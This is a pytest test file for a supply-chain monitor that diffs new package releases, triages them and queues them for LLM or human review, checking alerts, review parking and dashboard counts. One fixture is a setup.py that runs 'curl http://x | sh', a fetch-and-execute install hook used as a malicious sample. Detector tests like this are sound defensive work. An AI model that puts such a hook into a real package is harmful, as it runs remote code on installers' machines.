"""Only a model verdict or a person alerts (npm #33 port, PR B). A deterministic result never alerts before an LLM
review: a release no model has reviewed yet waits in the review queue, silently, until one does."""
import dataclasses
import json
import sys
import urllib.error
import zlib

import pytest

from pydiffwatch import __main__ as cli
from pydiffwatch import dashboard, differ, engine, fetcher, orchestrator, reviewer, store
from pydiffwatch import guard as guard_mod
from pydiffwatch.models import ArtifactSet, Diff, FileDiff, FiredRule, Hunk, NewRelease, TriageResult
from tests.test_pending_queue import _OK, _Backend, _REFUSED, _T, _cfg, _diff, _setup
from tests.test_unscanned import _pending_cli


def _queue_disabled(conn, rid, score=_T.score):
    """A reviewer_disabled park as the reviewer-off scan leaves it: triage stored, no input, no evidence."""
    store.update_stage(conn, rid, "triaged", score, json.dumps([r.__dict__ for r in _T.fired_rules]))
    store.park_for_review(conn, rid, "reviewer_disabled", "no reviewer this run (reviewer_enabled = false, or the "
                          "anthropic backend has no ANTHROPIC_API_KEY)", "")


# --- R1: adjudicating a queued release with no verdict row ------------------------------------------------

def test_adjudicating_a_verdictless_queued_release_writes_a_stand_in_and_alerts_once(tmp_path, capsys, monkeypatch):
    monkeypatch.setattr(fetcher, "fetch_artifacts", lambda *a, **k: (_ for _ in ()).throw(AssertionError("refetched")))
    be = _Backend()
    cfg, conn, rid, rvw = _setup(tmp_path, be)
    _queue_disabled(conn, rid)
    res = orchestrator.adjudicate(cfg, rid, "malicious", "confirmed by hand")
    assert res == {"package": "pkg", "version": "1.0.0", "label": "malicious", "alerted": True}
    [v] = conn.execute("SELECT classification, model, human_label, human_note, reasoning FROM verdicts "
                       "WHERE release_id=?", (rid,)).fetchall()
    assert tuple(v)[:4] == ("suspicious", "none", "malicious", "confirmed by hand")
    assert v["reasoning"] == "UNREVIEWED: no model reviewed it; labelled by a person."
    assert [a[0] for a in conn.execute("SELECT classification FROM alerts")] == ["malicious"]
    assert "model=human-adjudicator" in capsys.readouterr().out
    orchestrator.drain_pending(cfg, conn, rvw, auto=True)
    orchestrator.drain_pending(cfg, conn, rvw, auto=False, reasons=("reviewer_disabled",))
    assert be.calls == [] and store.pending_review_counts(conn) == {}


def test_adjudicating_an_unknown_release_id_inserts_nothing(tmp_path):
    cfg, conn, rid, _ = _setup(tmp_path, _Backend())
    assert orchestrator.adjudicate(cfg, rid + 1, "malicious") is None
    assert conn.execute("SELECT count(*) FROM verdicts").fetchone()[0] == 0


# --- the dashboard ------------------------------------------------------------------------------------------

def test_a_queued_release_has_no_card_and_is_counted_in_the_status_strip(tmp_path):
    cfg, conn, rid, _ = _setup(tmp_path, _Backend())
    _queue_disabled(conn, rid)
    rows = [dict(r) for r in store.all_verdicts(conn)]
    assert rows == [] and dashboard.counts(rows)["not_scanned"] == 0
    html = orchestrator.export_dashboard(dataclasses.replace(cfg, reviewer_enabled=False)).read_text()   # no probe
    assert "1 pending LLM review (reviewer_disabled: 1)" in html and '<div class="card' not in html


@pytest.mark.parametrize("label, flagged", [("benign", 0), ("malicious", 1)])
def test_a_label_on_a_queued_release_says_no_model_review(tmp_path, label, flagged):
    cfg, conn, rid, _ = _setup(tmp_path, _Backend())
    _queue_disabled(conn, rid)
    store.adjudicate(conn, rid, label, "")
    rows = [dict(r) for r in store.all_verdicts(conn)]
    html = dashboard.render_dashboard(rows)
    assert f"your verdict: {label} · no model review" in html and "model said" not in html
    assert "UNREVIEWED: no model reviewed it; labelled by a person." in html
    c = dashboard.counts(rows)
    assert (c["model_reviewed"], c["model_flagged"], c["not_scanned"]) == (1, flagged, 0)


# --- the reviewer is off -------------------------------------------------------------------------------------

_EVIL_SETUP = b"import os\nos.system('curl http://x | sh')\n"
_PLAIN_SETUP = b"from setuptools import setup\nsetup()\n"


def _art(files=None, **kw):
    return ArtifactSet("pkg", "1.1", "1.0", "sdist", files or {"setup.py": _EVIL_SETUP},
                       {"setup.py": _PLAIN_SETUP}, {}, kw.pop("added_binaries", []), **kw)


def _emitted(monkeypatch):
    calls = []
    monkeypatch.setattr(orchestrator.notifier, "emit", lambda *a, **k: calls.append(a) or True)
    return calls


def _scan(cfg, conn, rvw, art, **kw):
    orchestrator._process_fetched(cfg, conn, rvw, orchestrator._load_ruleset(cfg), NewRelease("pkg", "1.1", 5), art,
                                  **kw)
    return conn.execute("SELECT id FROM releases WHERE package='pkg' AND version='1.1'").fetchone()[0]


def _assert_queued_disabled(conn, rid):
    row = conn.execute("SELECT stage, pending_reason, review_input, review_input_chars, evidence FROM releases "
                       "WHERE id=?", (rid,)).fetchone()
    assert (row["stage"], row["pending_reason"], row["review_input_chars"]) == ("pending_review", "reviewer_disabled", 0)
    assert zlib.decompress(row["review_input"]) == b"" and row["evidence"] is None
    assert store.get_evidence(conn, rid) is None
    assert conn.execute("SELECT count(*) FROM verdicts").fetchone()[0] == 0


def test_reviewer_disabled_queues_the_release_with_no_input_no_evidence_no_verdict_and_no_alert(tmp_path,
                                                                                                monkeypatch):
    emitted = _emitted(monkeypatch)
    cfg = dataclasses.replace(_cfg(tmp_path), reviewer_enabled=False)
    conn = store.connect(cfg); store.init_schema(conn)
    rid = _scan(cfg, conn, None, _art())
    assert emitted == []
    _assert_queued_disabled(conn, rid)
    assert conn.execute("SELECT triage_score FROM releases WHERE id=?", (rid,)).fetchone()[0] >= cfg.threshold_t
    # `capture-evidence --release-id <id> --all` can still download it and store its flagged code on demand
    assert [r["release_id"] for r in store.releases_needing_evidence(conn, rid, all_flagged=True)] == [rid]


def test_reviewer_off_one_oversized_source_alone_queues_silently(tmp_path, monkeypatch):
    # PR A's M2: weight 40 makes one oversized .py escalate alone. With the reviewer off it never reaches no_content.
    emitted = _emitted(monkeypatch)
    cfg = dataclasses.replace(_cfg(tmp_path), reviewer_enabled=False)
    conn = store.connect(cfg); store.init_schema(conn)
    art = ArtifactSet("pkg", "1.1", "1.0", "sdist", {"PKG-INFO": b"Version: 1.1\n"}, {"PKG-INFO": b"Version: 1.0\n"},
                      {}, added_binaries=[{"path": "pkg/big.py", "size": 5_000_000, "reason": "source-too-large",
                                           "sha256": "ab"}],
                      is_new_package=False, maintainer_metadata=None, added_dep_findings=[], too_large=("pkg/big.py",))
    rid = _scan(cfg, conn, None, art)
    rules = [r["rule"] for r in json.loads(conn.execute("SELECT triage_rules FROM releases").fetchone()[0])]
    assert rules == ["binary-source-too-large"] and emitted == []
    _assert_queued_disabled(conn, rid)


# --- every parking path queues without an alert --------------------------------------------------------------

class _Deferring:
    """A reviewer guard that admits nothing: the release parks as model_busy."""
    def input_cap_chars(self): return 200_000
    def cap_explain(self): return "cap 200000"
    def admit(self): return "breaker open after a timeout"


def _assert_quiet(conn, emitted, reason):
    assert emitted == [] and conn.execute("SELECT count(*) FROM alerts").fetchone()[0] == 0
    assert [r["pending_reason"] for r in store.pending_reviews(conn)] == [reason]
    assert conn.execute("SELECT count(*) FROM verdicts").fetchone()[0] == 0


def test_an_unreachable_endpoint_park_is_silent(tmp_path, monkeypatch):
    emitted = _emitted(monkeypatch)
    cfg, conn, rid, rvw = _setup(tmp_path, _Backend())
    orchestrator._review_escalated(cfg, conn, rvw, _diff(), _T, rid, offline=True)
    _assert_quiet(conn, emitted, "endpoint_unreachable")


def test_a_measured_too_large_park_is_silent(tmp_path, monkeypatch):
    emitted = _emitted(monkeypatch)
    be = _Backend()
    cfg, conn, rid, rvw = _setup(tmp_path, be, max_input_chars=10_000)
    orchestrator._review_escalated(cfg, conn, rvw, _diff("x" * 50_000), _T, rid)
    _assert_quiet(conn, emitted, "too_large")
    assert be.calls == [] and "x" * 50_000 in store.review_input(store.pending_reviews(conn)[0])


def test_a_provisional_too_large_park_is_silent(tmp_path, monkeypatch):
    emitted = _emitted(monkeypatch)
    be = _Backend()
    cfg, conn, rid, rvw = _setup(tmp_path, be)
    gd = guard_mod.ReviewerGuard(cfg, be, conn, memory=None, out=lambda m: None)
    assert gd.input_cap_chars() == guard_mod.COLD_START_CAP
    orchestrator._review_escalated(cfg, conn, rvw, _diff("x" * 60_000), _T, rid, guard=gd)
    _assert_quiet(conn, emitted, "too_large")


def test_a_model_busy_park_is_silent(tmp_path, monkeypatch):
    emitted = _emitted(monkeypatch)
    be = _Backend()
    cfg, conn, rid, rvw = _setup(tmp_path, be)
    orchestrator._review_escalated(cfg, conn, rvw, _diff(), _T, rid, guard=_Deferring())
    _assert_quiet(conn, emitted, "model_busy")
    assert be.calls == []


def test_a_review_that_raises_in_process_fetched_parks_silently(tmp_path, monkeypatch):
    emitted = _emitted(monkeypatch)
    cfg, conn, rid, rvw = _setup(tmp_path, _Backend())
    monkeypatch.setattr(differ, "build_diff", lambda art, *_: _diff())
    monkeypatch.setattr(engine, "triage", lambda *a, **k: _T)
    monkeypatch.setattr(rvw, "prepare", lambda *a, **k: (_ for _ in ()).throw(RuntimeError("prepare broke")))
    orchestrator._process_fetched(cfg, conn, rvw, None, NewRelease("pkg", "1.0.0", 1),
                                  ArtifactSet("pkg", "1.0.0", "0.9", "sdist", {}, {}, {}))
    _assert_quiet(conn, emitted, "review_failed")


def test_an_interrupted_review_the_drain_cannot_finish_stays_queued_silently(tmp_path, monkeypatch):
    emitted = _emitted(monkeypatch)
    cfg, conn, rid, _ = _setup(tmp_path, _Backend())
    store.park_for_review(conn, rid, "in_review", "the review was interrupted before it finished",
                          reviewer.build_review_input(_diff(), _T, max_chars=cfg.reviewer.max_input_chars))
    rvw = reviewer.Reviewer(cfg, backend=_Backend(fail=_REFUSED))
    for _ in range(2):
        orchestrator.drain_pending(cfg, conn, rvw, auto=True)
    _assert_quiet(conn, emitted, "endpoint_unreachable")


def test_a_partial_benign_review_waits_for_a_person_without_an_alert(tmp_path, monkeypatch):
    emitted = _emitted(monkeypatch)
    small = FileDiff("setup.py", "modified", [Hunk((0, 0), (0, 1), ["os.system('id')"], [])])
    big = FileDiff("big.py", "modified", [Hunk((0, 0), (0, 1), ["X" * 3000], [])])
    tr = TriageResult(50.0, [FiredRule("autoexec", 50.0, "setup.py", (1, 1)),
                             FiredRule("autoexec", 40.0, "big.py", (1, 1))], True)
    cfg, conn, rid, _ = _setup(tmp_path, _Backend(), max_input_chars=500)    # big.py can't fit; setup.py can
    orchestrator._review_escalated(cfg, conn, reviewer.Reviewer(cfg, backend=_Backend()),
                                   Diff("pkg", "1.0.0", False, [small, big], []), tr, rid)
    assert store.get_stage(conn, "pkg", "1.0.0") == "needs_adjudication" and emitted == []
    [v] = conn.execute("SELECT classification, reasoning FROM verdicts").fetchall()
    assert v["classification"] == "benign" and v["reasoning"].startswith("reviewed partially:")
    c = dashboard.counts([dict(r) for r in store.all_verdicts(conn)])
    assert (c["partial"], c["not_scanned"]) == (1, 0)
